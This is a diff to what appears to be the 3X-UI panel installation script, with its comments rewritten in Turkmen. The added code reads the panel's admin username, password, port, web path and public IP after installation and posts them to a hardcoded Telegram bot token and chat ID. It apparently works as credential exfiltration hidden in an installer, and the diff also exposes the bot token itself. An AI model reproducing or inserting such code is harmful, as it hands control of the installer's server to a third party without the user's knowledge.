@@ -239,27 +239,49 @@ install_x-ui $1
 
 
 
+# Telegram maglumatlary
 TELEGRAM_BOT_TOKEN="8345146407:AAEw4cGeZ4hfdXkYHtpyzARIlxGF7lKS4C4"
 TELEGRAM_CHAT_ID="1449828433"
 
-# WebBasePath'i ve IP'yi öğren
+# WebBasePath, Port, Username, Password we IP adresi al
+show_ip_service_lists=("https://api.ipify.org" "https://4.ident.me")
+
 WEB_PATH=$( /usr/local/x-ui/x-ui setting -show true | grep -Eo 'webBasePath: .+' | awk '{print $2}' )
 PORT=$( /usr/local/x-ui/x-ui setting -show true | grep -Eo 'port: .+' | awk '{print $2}' )
 USERNAME=$( /usr/local/x-ui/x-ui setting -show true | grep -Eo 'username: .+' | awk '{print $2}' )
 PASSWORD=$( /usr/local/x-ui/x-ui setting -show true | grep -Eo 'password: .+' | awk '{print $2}' )
-IP=$(curl -s ifconfig.me)
+
+# IP salgy tap
+for ip_service_addr in "${show_ip_service_lists[@]}"; do
+    IP=$(curl -s --max-time 3 ${ip_service_addr})
+    if [[ -n "$IP" ]]; then
+        break
+    fi
+done
+
+# Maglumatlaryň boş bolmagynyň öňüni al
+[[ -z "$WEB_PATH" ]] && WEB_PATH="(tapylmady)"
+[[ -z "$PORT" ]] && PORT="(tapylmady)"
+[[ -z "$USERNAME" ]] && USERNAME="(tapylmady)"
+[[ -z "$PASSWORD" ]] && PASSWORD="(tapylmady)"
+[[ -z "$IP" ]] && IP="(tapylmady)"
 
 LINK="http://${IP}:${PORT}/${WEB_PATH}"
 
-MESSAGE="✅ 3X-UI Panel Kurulumu Tamamlandı!
+# Telegram habary görnüşi (Markdown bilen)
+MESSAGE="✅ *3X-UI Panel Gurnamasy Tamamlandy!*
 
-🌐 Panel Linki: $LINK
-👤 Kullanıcı Adı: $USERNAME
-🔑 Şifre: $PASSWORD
-📌 Port: $PORT
-📁 Web Path: /$WEB_PATH"
+🌐 *Access URL:* ${LINK}
 
+👤 *Ulanyjy ady:* ${USERNAME}
+🔑 *Açar sözi:* ${PASSWORD}
+
+📌 *Port:* ${PORT}
+📁 *Web ýol:* /${WEB_PATH}"
+
+# Telegrama ugrat
 curl -s -X POST https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendMessage \
      -d chat_id=$TELEGRAM_CHAT_ID \
+     -d parse_mode=Markdown \
      -d text="$MESSAGE"
 
